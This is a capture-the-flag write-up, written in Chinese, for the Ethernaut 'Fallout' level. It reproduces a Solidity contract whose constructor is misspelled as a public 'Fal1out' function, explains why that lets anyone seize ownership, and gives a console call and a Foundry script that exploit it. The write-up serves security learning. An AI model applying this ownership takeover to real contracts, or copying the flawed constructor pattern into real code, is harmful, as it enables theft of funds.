# Ethernaut CTF Writeup

## Level 2 Fallout

> 題目: https://ethernaut.openzeppelin.com/level/0x4209f564b6fDB63B34866CEa4B43BF333BcAAAD9

原始碼:
```
// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

import "openzeppelin-contracts-06/math/SafeMath.sol";

contract Fallout {
    using SafeMath for uint256;

    mapping(address => uint256) allocations;
    address payable public owner;

    /* constructor */
    function Fal1out() public payable {
        owner = msg.sender;
        allocations[owner] = msg.value;
    }

    modifier onlyOwner() {
        require(msg.sender == owner, "caller is not the owner");
        _;
    }

    function allocate() public payable {
        allocations[msg.sender] = allocations[msg.sender].add(msg.value);
    }

    function sendAllocation(address payable allocator) public {
        require(allocations[allocator] > 0);
        allocator.transfer(allocations[allocator]);
    }

    function collectAllocations() public onlyOwner {
        msg.sender.transfer(address(this).balance);
    }

    function allocatorBalance(address allocator) public view returns (uint256) {
        return allocations[allocator];
    }
}
```

過關條件: 

- 獲得合約的所有權

解法：

- 這個合約並沒有 constructor (應該要是一個名為 `Fallout` 的函數，但只見一個 `Fal1out` 函數)，這可能發生在改變合約名稱時沒有改變 constructor 名稱，或純粹打錯字
- 這使任何人都可以去調用 `Fal1out` 函數，取得合約所有權
- PoC (console) `contract.Fal1out()`
- PoC (foundry) - level2.s.sol

```
// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

import "forge-std/Script.sol";
import {Fallout} from "../src/level2/Fallout.sol";

contract PwnFallout is Script {
    Fallout target = Fallout(payable(0x4FB940bD982b5Fd6888FB3C442aF18C2A514E44a));
    
    function run() public {
        vm.startBroadcast();
        console.log("Current Owner is: ", target.owner());
        
        // get the owner
        target.Fal1out();

        console.log("Current Owner is: ", target.owner());
        vm.stopBroadcast();
    }
}
```